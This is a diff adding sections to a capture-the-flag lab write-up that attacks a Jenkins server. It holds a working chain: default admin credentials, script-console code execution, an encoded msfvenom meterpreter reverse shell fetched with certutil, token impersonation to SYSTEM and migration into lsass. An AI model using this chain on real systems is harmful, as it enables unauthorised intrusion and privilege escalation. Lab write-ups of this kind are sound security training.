@@ -59,6 +59,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 105.23 seconds
 ```
 
+# Enumeration
 Interesting, we find a robots.txt file, the hostname, and likely some service running on port 8080 called Jetty. Lets start a gobuster scan and see what we find. Meanwhile, lets check out the webpages themselves. Just going to the IP in the web browser brings up a RIP Bruce Wayne page, asking for donations - funny. I'll check `http://$IP:8080` next.
 
 ![[JenkinsLogin.png]]
@@ -92,6 +93,149 @@ However, admin:admin worked! And we're greeted with a dashboard page.
 
 ![[JenkinsDashboard.png]]
 
-So, it looks like there's a way to trigger remote code execution in the project folder via "Windows Batch Commands", but I'm not sure if this is the route. There is also a script console that will definitely run RCE on the box. 
+So, it looks like there's a way to trigger remote code execution in the project folder via "Windows Batch Commands", but I'm not sure if this is the route. There is also a script console that will definitely run RCE on the box. The guide mentions something else, but if we have RCE through this script console, we can try using certutil.exe to download a meterpreter payload here.
 
 ![[JenkinsScriptConsole.png]]
+
+# Gaining a Foothold
+
+Now on our attack box, or my Kali VM, I start up a simple python http listener. 
+`python3 -m http.server 80`
+
+Then generate our payload in the directory we're hosting our python "web server".
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<my VPN IP> LPORT=4444 -f exe -o meterpshell.exe`
+
+We can use `ls -la` in the directory to get the size of this payload for one of our questions since we're using that same payload they recommend.
+```
+total 84
+drwxr-xr-x 2 kali kali  4096 Jul  2 10:09 .
+drwxr-xr-x 6 kali kali  4096 Jul  2 09:06 ..
+-rw-r--r-- 1 kali kali 73802 Jul  2 10:09 meterpshell.exe
+```
+
+Now, we input our certutil.exe command.
+
+![[JenkinsScriptConsoleUpload.png]]
+
+After a few moments we get confirmation the file was uploaded.
+
+![[JenkinsCertUtilUploadSuccessful.png]]
+
+When we look at the web server we're hosting also confirms this:
+```
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.128.105 - - [02/Jul/2024 10:15:01] "GET /meterpshell.exe HTTP/1.1" 200 -
+10.10.128.105 - - [02/Jul/2024 10:15:05] "GET /meterpshell.exe HTTP/1.1" 200 -
+```
+
+Now we can stop our little webserver and open msfconsole.
+`service postgresql start`
+`msfconsole`
+And we want to set up our msfconsole listener.
+`use exploit/multi/handler`
+And then set our PAYLOAD as the reverseshell created before and the LHOST to our IP
+`set PAYLOAD windows/meterpreter/reverse_tcp`
+`set LHOST <my VPN IP>`
+And run it.
+`run`
+
+Now, in the Jenkins script console, let's execute our payload.
+`println "meterpshell.exe".execute().text` 
+
+Confirm we're on the box!
+```
+[*] Started reverse TCP handler on 10.13.62.120:4444 
+[*] Sending stage (176198 bytes) to 10.10.128.105
+[*] Meterpreter session 1 opened (10.13.62.120:4444 -> 10.10.128.105:49288) at 2024-07-02 10:25:42 -0400
+
+meterpreter > 
+```
+# Privilege Escalation
+
+Now that we're on the box, lets grab the user flag for our question.
+
+`cd /users/bruce/desktop`
+
+`cat user.txt`
+
+Following the guide, they're telling us to use token impersonation. Lets check that. In meterpreter, we drop into the shell with `shell` and run the provided command.
+
+```
+C:\users\bruce\Desktop>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+```
+
+Debug, Impersonate, and Create Global are all enabled for the Bruce user.
+
+Now, we can load the incognito module like the room suggests.
+First, exit the shell session.
+`exit`
+Then, 
+`load incognito`
+
+Using impersonate, we can become NT AUTHORITY\SYSTEM
+```
+meterpreter > impersonate_token "BUILTIN\Administrators"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+```
+
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+This answers one of our questions.
+
+Next, we need to migrate to the LSASS.exe process.
+
+`pgrep lsass.exe`
+
+```
+meterpreter > pgrep lsass
+676
+meterpreter > migrate 676
+[*] Migrating from 3020 to 676...
+[*] Migration completed successfully.
+```
+
+Now instead of impersonating SYSTEM, we *are* SYSTEM.
+
+# Post Exploitation
+
+Now to just navigate to the flag location and answer the final question.
+I had to drop into a shell due to meterpreter prompt giving funky characters when I tried to `cat` out the file.
+
+![[JenkinsCompleted.png]]
+
+Thank you for stopping by!
